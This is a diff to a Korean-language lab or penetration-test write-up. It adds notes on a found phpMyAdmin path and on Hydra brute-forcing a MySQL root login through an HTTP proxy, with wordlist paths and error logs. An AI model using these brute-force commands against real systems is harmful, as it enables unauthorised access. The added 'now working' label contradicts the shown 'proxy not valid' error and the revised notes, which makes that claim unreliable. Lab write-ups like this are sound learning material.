@@ -324,6 +324,7 @@ done
 
 - 8080 port found!
   ![8080 found](image_19.png)
+- phpmyadmin path found
 
 ## 5. 내부 웹
 
@@ -816,7 +817,7 @@ $(function() {
 ## 6. Hydra
 
 ```bash
-hydra -l root -P /usr/share/wo
+hydra -l root -P /usr/share/wordlists/...  (명령어 잘림, 원본 미확인)
 ```
 
 ```bash
@@ -841,13 +842,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:33:
 [ERROR] File for passwords not found: passes.txt
 ```
 
-- hydra MYSQL 모듈을 지원하지 않으므로 접기
+- hydra mysql 모듈의 HYDRA_PROXY 미지원으로 직접 접근 보류, proxychains4 우회도 실패
 - 추후 python custom try
 
 Most-Popular-Letter-Passes.txt
 /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt
 
 ```bash
+# now working
 HYDRA_PROXY=http://192.168.112.189:3128 hydra -l root -P /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
 ```
 
@@ -878,7 +880,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:36:
 [ERROR] proxy defined but not valid, exiting
 ```
 
-- http 지원 안 한다고 경고
+- HYDRA_PROXY에 http:// 형식을 쓸 수 없어 경고 (connect://, socks4://, socks5:// 또는 proxychains4 사용 필요)
 - password
   /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt
 - username
